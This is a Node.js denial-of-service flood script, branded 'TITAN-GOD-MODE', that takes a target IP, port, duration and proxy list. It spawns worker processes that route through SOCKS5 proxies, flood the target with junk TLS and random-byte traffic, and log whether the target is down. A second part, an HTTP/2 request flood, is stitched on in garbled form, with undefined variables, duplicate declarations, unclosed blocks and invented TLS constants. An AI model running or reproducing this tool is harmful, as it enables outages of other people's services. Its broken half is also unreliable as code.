const net = require("net");
const cluster = require("cluster");
const fs = require("fs");
const crypto = require("crypto");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (cluster.isMaster) {
    const target_ip = process.argv[2];
    const target_port = process.argv[3];
    const duration = process.argv[4];
    const threads = process.argv[5];
    const proxyFile = process.argv[6];

    console.log(`\x1b[35m[TITAN-GOD-MODE]\x1b[0m 🔱 ALL SYSTEMS OVERCLOCKED`);
    console.log(`\x1b[36m[LOG]\x1b[0m L4 Multi-Vector + Zero-Window + PPS-Maxing Active`);

    // Smart Proxy Health Check & Monitor
    setInterval(() => {
        const check = net.connect({host: target_ip, port: parseInt(target_port), timeout: 1000}, () => {
            console.log(`\x1b[32m[STATUS] ${target_ip} IS CHOKING ✅\x1b[0m`);
            check.destroy();
        });
        check.on('error', () => {
            console.log(`\x1b[31m[STATUS] ${target_ip} IS DOWN 💀\x1b[0m`);
            check.destroy();
        });
    }, 2000);

    for (let i = 0; i < threads; i++) cluster.fork();
    setTimeout(() => { process.exit(); }, duration * 1000);

} else {
    const target_ip = process.argv[2];
    const target_port = parseInt(process.argv[3]);
    const proxies = fs.readFileSync(process.argv[6], 'utf-8').split('\n').filter(Boolean);
    
    // Go-Style Buffer Management (2MB + Junk Vectors)
    const heavyBuffer = crypto.randomBytes(2 * 1024 * 1024); 
    const junkVector = crypto.randomBytes(1024);
    const tlsVector = Buffer.from([0x16, 0x03, 0x01, 0x02, 0x00, 0x01, 0x00, 0x01, 0xfc]);

    function launchGodMode() {
        // Smart Proxy Rotation
        const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');
        
        const socket = net.connect({
            host: proxy[0],
            port: parseInt(proxy[1]),
            noDelay: true,
            keepAlive: true,
            allowHalfOpen: true
        });
        
        function randomString(length) {
   var result = "";
   var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   var charactersLength = characters.length;
   for (var i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   ;
   return result;
 }

 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
} 

        // TCP Window Scaling: Server ke buffers ko block karna
        socket.setNoDelay(true);

        socket.on('connect', () => {
            socket.cork(); 

            // Feature: SOCKS5 Authentication Bypass
            socket.write(Buffer.concat([
                Buffer.from([0x05, 0x01, 0x00]),
                Buffer.from([0x05, 0x01, 0x00, 0x03, target_ip.length]),
                Buffer.from(target_ip),
                Buffer.from([(target_port >> 8) & 0xFF, target_port & 0xFF])
            ]));

            // Multi-Vector Junk Flood (TCP + TLS Junk)
            const flood = () => {
                if (!socket.writable) return;
                
                // PPS Maxing loop (Golang Speed Mimic)
                for(let i = 0; i < 60; i++) {
                    socket.write(tlsVector);
                    socket.write(junkVector);
                }

                // Zero-Pattern 2MB Chunk Burst
                const start = Math.floor(Math.random() * (heavyBuffer.length - 2048));
                socket.write(heavyBuffer.slice(start, start + 2048));
                
                setImmediate(flood); 
            };
            
            flood();
            socket.uncork();
        });

        socket.on('error', () => socket.destroy());
        // Smart Recycling: Har 1.5s mein connection rotate
        socket.setTimeout(1500, () => socket.destroy());
    }

    // Extreme Velocity: 150 connection triggers per ms
    
    const tlsOptions = {
            ALPNProtocols: ['h2'],
            challengesToSolve: Infinity,
            resolveWithFullResponse: true,
            followAllRedirects: true,
            maxRedirects: 10,
            clientTimeout: 5000,
            clientlareMaxTimeout: 10000,
            cloudflareTimeout: 5000,
            cloudflareMaxTimeout: 30000,
            ciphers: tls.getCiphers().join(":") + cipper,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
            servername: url.hostname,
            socket: connection,
            honorCipherOrder: true,
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
            sigals: concu,
            echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448",
            secure: true,
            Compression: false,
            rejectUnauthorized: false,
            port: 443,
            uri: parsedTarget.host,
            servername: parsedTarget.host,
            sessionTimeout: 5000,
        };

const socket = tls.connect(443, parsed.host, options, () => {
        const client = http2.connect(parsed.href, {
            createConnection: () => socket,
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 100,
                initialWindowSize: 6291456,
            }
        });
        
                 const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
          
          client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });
          
          client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });